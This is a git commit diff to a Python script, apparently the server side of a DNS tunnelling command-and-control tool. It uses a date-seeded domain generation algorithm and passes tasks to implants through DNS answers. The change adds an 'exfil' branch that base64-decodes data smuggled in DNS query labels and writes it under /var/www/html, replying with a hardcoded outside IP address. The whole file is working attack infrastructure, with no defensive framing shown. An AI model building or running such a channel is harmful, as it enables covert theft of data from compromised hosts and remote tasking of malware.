223277977beb12f4e1b8fc9158bacdf64f4071f0
dnsTunneling <prydzynski@gmail.com>
2018-08-02 09:29:13 -0400

    updated web page functionality

--- demo.py
+++ demo.py
@@ -4,6 +4,7 @@
 import socket
 from datetime import datetime
 from dnslib import *
+import base64
 
 def dga(char_set=None, size=None, seed=None):
 	if not char_set:
@@ -38,13 +39,27 @@ def create_dns(data):
 	qt = QTYPE[qtype]
 	
 	if len(qn_tmp) == 5:
-		cache_bust = ord(qn_tmp[0])
-		id = qn_tmp[1]
-		qn = '.'.join(qn_tmp[2:]) + '.'
-		response_record = '.'.join([str(cache_bust), id, give_task])
+		print(qn_tmp[2])
+		if qn_tmp[2] == 'exfil':
+			payload = qn_tmp[0]
+			padding_mod = len(payload) % 4
+			padding = 4 - padding_mod
+			payload = payload + padding * '='
+			payload = base64.b64decode(payload)
+			id = qn_tmp[1]
+			print(payload)
+			with open ('/var/www/html/' + str(id), 'wb') as o:
+				o.write(payload)
+			response_record = '104.131.53.79'
+		elif qn_tmp[2] == 'task':
+			cache_bust = ord(qn_tmp[0])
+			id = qn_tmp[1]
+			qn = '.'.join(qn_tmp[2:]) + '.'
+			response_record = '.'.join([str(cache_bust), id, give_task])
 	else:
 		qn = '.'.join(qn_tmp) + '.'
-		response_record = '1.1.1.1'
+		response_record = '104.131.53.79'
+		#response_record = '1.1.1.1'
 	
 	reply.add_ar(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=NS(dga_domain)))
 	reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, "A"), rclass=1, ttl=TTL, rdata=A(response_record)))
@@ -60,8 +75,11 @@ def respond_dns(reply, addr):
 
 #Establish tasking domain and ip info
 dga_domain = dga(seed="1533254400")
+print(dga_domain)
 ask_task = "task." + dga_domain + "."
-give_task = '1.1' #switch from 1's to indicate task is coming
+#give_task = '1.1' #switch from 1's to indicate task is coming
+give_task = '2.5'
+
 
 #Create a UDP socket object
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
